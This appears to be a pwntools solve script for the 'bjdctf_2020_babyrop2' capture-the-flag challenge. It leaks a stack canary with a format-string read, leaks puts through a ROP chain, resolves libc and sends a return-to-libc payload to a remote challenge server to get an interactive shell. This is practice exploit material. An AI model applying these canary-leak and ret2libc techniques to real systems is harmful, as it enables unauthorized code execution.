from pwn import *
from LibcSearcher import *

import utils

context.arch = 'amd64'
context.log_level = 'debug'

elf = ELF('../bjdctf_2020_babyrop2')

target = remote('node4.buuoj.cn', 28282)

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = elf.sym['main']

# Leak canary and ret2libc.
payload = b'%7$p'
target.sendlineafter('u!\n', payload)
canary = int(target.recv(18), 16)
print(hex(canary))

pop_rdi = 0x400993

# payload = b'a' * 0x18 + p64(canary) + p64(0) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
payload = utils.create_rop_payload(0x18, {pop_rdi: [puts_got]}, 'x86_64', puts_plt, canary, main)
target.sendlineafter('story!\n', payload)
puts_addr = u64(target.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
print(hex(puts_addr))

ans = utils.get_shell_from_libc("puts", puts_addr)
payload = utils.create_rop_payload(0x18, {pop_rdi: [ans[1]]}, 'x86_64', ans[0], canary)
target.sendlineafter('u!\n', 'aaaaaa')
target.sendlineafter('story!\n', payload)

target.interactive()